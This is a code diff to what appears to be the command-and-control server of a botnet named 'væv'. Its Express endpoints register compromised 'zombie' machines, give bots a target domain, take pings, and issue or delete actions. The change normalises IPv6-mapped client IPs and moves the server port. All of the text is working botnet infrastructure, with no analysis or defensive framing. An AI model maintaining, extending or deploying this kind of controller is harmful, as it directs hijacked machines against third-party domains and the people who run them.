@@ -41,7 +41,7 @@ app.post('/api/v1/zombie/:architecture', (req, res) => {
 
             if(users.length == 1)
             {
-                database.query("SELECT * FROM zombies WHERE ip = ?", [req.ip], function(error, zombies, fields) {
+                database.query("SELECT * FROM zombies WHERE ip = ?", [req.ip.replace('::ffff:', '')], function(error, zombies, fields) {
                     if(error)
                     {
                         res.status(500).json({status: "failure", message: "Internal server error!"});
@@ -52,7 +52,7 @@ app.post('/api/v1/zombie/:architecture', (req, res) => {
                         const zombie = zombies[0];
 
                         const id = uuid.v4();
-                        database.query("INSERT INTO zombies (id, ip, owner, architecture) VALUES(?, ?, ?, ?)", [id, req.ip, req.body.owner, req.params.architecture], function(error, domains, fields) {
+                        database.query("INSERT INTO zombies (id, ip, owner, architecture) VALUES(?, ?, ?, ?)", [id, req.ip.replace('::ffff:', ''), req.body.owner, req.params.architecture], function(error, domains, fields) {
                             if(error)
                             {
                                 res.status(500).json({status: "failure", message: "Internal server error!"});
@@ -65,10 +65,10 @@ app.post('/api/v1/zombie/:architecture', (req, res) => {
                     else
                     {
                         res.status(404).json({status: "failure", message: "This bot already exists"});
-                        database.query("INSERT INTO suspicious_activity (id, info, ip) VALUES(?, ?, ?)", [uuid.v4(), "Tried adding bot that already exists", req.ip], function(error, result, fields) {
+                        database.query("INSERT INTO suspicious_activity (id, info, ip) VALUES(?, ?, ?)", [uuid.v4(), "Tried adding bot that already exists", req.ip.replace('::ffff:', '')], function(error, result, fields) {
                             if(error) throw error;
 
-                            console.log(`[væv] logged suspicious activity from ${req.ip}`);
+                            console.log(`[væv] logged suspicious activity from ${req.ip.replace('::ffff:', '')}`);
                         });
                     }
                 });
@@ -77,10 +77,10 @@ app.post('/api/v1/zombie/:architecture', (req, res) => {
             {
                 res.status(404).json({status: "failure", message: "Invalid owner passed"});
 
-                database.query("INSERT INTO suspicious_activity (id, info, ip) VALUES(?, ?, ?)", [uuid.v4(), "Tried adding bot with invalid owner!", req.ip], function(error, result, fields) {
+                database.query("INSERT INTO suspicious_activity (id, info, ip) VALUES(?, ?, ?)", [uuid.v4(), "Tried adding bot with invalid owner!", req.ip.replace('::ffff:', '')], function(error, result, fields) {
                     if(error) throw error;
         
-                    console.log(`[væv] logged suspicious activity from ${req.ip}`);
+                    console.log(`[væv] logged suspicious activity from ${req.ip.replace('::ffff:', '')}`);
                 });
             }
         });
@@ -88,16 +88,16 @@ app.post('/api/v1/zombie/:architecture', (req, res) => {
     else
     {
         res.status(404).json({status: "failure", message: "Way too long architecture!"});
-        database.query("INSERT INTO suspicious_activity (id, info, ip) VALUES(?, ?, ?)", [uuid.v4(), "Tried adding bot with huge architecture!", req.ip], function(error, result, fields) {
+        database.query("INSERT INTO suspicious_activity (id, info, ip) VALUES(?, ?, ?)", [uuid.v4(), "Tried adding bot with huge architecture!", req.ip.replace('::ffff:', '')], function(error, result, fields) {
             if(error) throw error;
 
-            console.log(`[væv] logged suspicious activity from ${req.ip}`);
+            console.log(`[væv] logged suspicious activity from ${req.ip.replace('::ffff:', '')}`);
         });
     }
 });
 
 app.get('/api/v1/domain', (req, res) => {
-    database.query("SELECT * FROM zombies WHERE ip = ?", [req.ip], function(error, zombies, fields) {
+    database.query("SELECT * FROM zombies WHERE ip = ?", [req.ip.replace('::ffff:', '')], function(error, zombies, fields) {
         if(error)
         {
             res.status(500).json({status: "failure", message: "Internal server error!"});
@@ -134,17 +134,17 @@ app.get('/api/v1/domain', (req, res) => {
         else
         {
             res.status(404).json({status: "failure", message: "You're not a valid bot!"});
-            database.query("INSERT INTO suspicious_activity (id, info, ip) VALUES(?, ?, ?)", [uuid.v4(), "Invalid bot tried fetching domain", req.ip], function(error, result, fields) {
+            database.query("INSERT INTO suspicious_activity (id, info, ip) VALUES(?, ?, ?)", [uuid.v4(), "Invalid bot tried fetching domain", req.ip.replace('::ffff:', '')], function(error, result, fields) {
                 if(error) throw error;
 
-                console.log(`[væv] logged suspicious activity from ${req.ip}`);
+                console.log(`[væv] logged suspicious activity from ${req.ip.replace('::ffff:', '')}`);
             });
         }
     });
 });
 
 app.get('/api/v1/ping', (req, res) => {
-    database.query("SELECT * FROM zombies WHERE ip = ?", [req.ip], function(error, zombies, fields) {
+    database.query("SELECT * FROM zombies WHERE ip = ?", [req.ip.replace('::ffff:', '')], function(error, zombies, fields) {
         if(error)
         {
             res.status(500).json({status: "failure", message: "Internal server error!"});
@@ -173,17 +173,17 @@ app.get('/api/v1/ping', (req, res) => {
         else
         {
             res.status(404).json({status: "failure", message: "You're not a valid bot!"});
-            database.query("INSERT INTO suspicious_activity (id, info, ip) VALUES(?, ?, ?)", [uuid.v4(), "Invalid bot tried fetching domain", req.ip], function(error, result, fields) {
+            database.query("INSERT INTO suspicious_activity (id, info, ip) VALUES(?, ?, ?)", [uuid.v4(), "Invalid bot tried fetching domain", req.ip.replace('::ffff:', '')], function(error, result, fields) {
                 if(error) throw error;
 
-                console.log(`[væv] logged suspicious activity from ${req.ip}`);
+                console.log(`[væv] logged suspicious activity from ${req.ip.replace('::ffff:', '')}`);
             });
         }
     });
 });
 
 app.get('/api/v1/action', (req, res) => {
-    database.query("SELECT * FROM zombies WHERE ip = ?", [req.ip], function(error, zombies, fields) {
+    database.query("SELECT * FROM zombies WHERE ip = ?", [req.ip.replace('::ffff:', '')], function(error, zombies, fields) {
         if(error)
         {
             res.status(500).json({status: "failure", message: "Internal server error!"});
@@ -219,10 +219,10 @@ app.get('/api/v1/action', (req, res) => {
         else
         {
             res.status(404).json({status: "failure", message: "You're not a valid bot!"});
-            database.query("INSERT INTO suspicious_activity (id, info, ip) VALUES(?, ?, ?)", [uuid.v4(), "Invalid bot tried getting action", req.ip], function(error, result, fields) {
+            database.query("INSERT INTO suspicious_activity (id, info, ip) VALUES(?, ?, ?)", [uuid.v4(), "Invalid bot tried getting action", req.ip.replace('::ffff:', '')], function(error, result, fields) {
                 if(error) throw error;
 
-                console.log(`[væv] logged suspicious activity from ${req.ip}`);
+                console.log(`[væv] logged suspicious activity from ${req.ip.replace('::ffff:', '')}`);
             });
         }
     });
@@ -231,7 +231,7 @@ app.get('/api/v1/action', (req, res) => {
 app.delete('/api/v1/action/:id', (req, res) => {
     if(req.params.id)
     {
-        database.query("SELECT * FROM zombies WHERE ip = ?", [req.ip], function(error, zombies, fields) {
+        database.query("SELECT * FROM zombies WHERE ip = ?", [req.ip.replace('::ffff:', '')], function(error, zombies, fields) {
             if(error)
             {
                 res.status(500).json({status: "failure", message: "Internal server error!"});
@@ -271,10 +271,10 @@ app.delete('/api/v1/action/:id', (req, res) => {
             else
             {
                 res.status(404).json({status: "failure", message: "You're not a valid bot!"});
-                database.query("INSERT INTO suspicious_activity (id, info, ip) VALUES(?, ?, ?)", [uuid.v4(), "Invalid bot tried fetching deleting action", req.ip], function(error, result, fields) {
+                database.query("INSERT INTO suspicious_activity (id, info, ip) VALUES(?, ?, ?)", [uuid.v4(), "Invalid bot tried fetching deleting action", req.ip.replace('::ffff:', '')], function(error, result, fields) {
                     if(error) throw error;
     
-                    console.log(`[væv] logged suspicious activity from ${req.ip}`);
+                    console.log(`[væv] logged suspicious activity from ${req.ip.replace('::ffff:', '')}`);
                 });
             }
         });
@@ -285,6 +285,6 @@ app.get('/', (req, res) => {
     res.status(200).render('info');
 });
 
-app.listen(8000, () => {
+app.listen(4000, () => {
     console.log('[væv] started listening')
 });
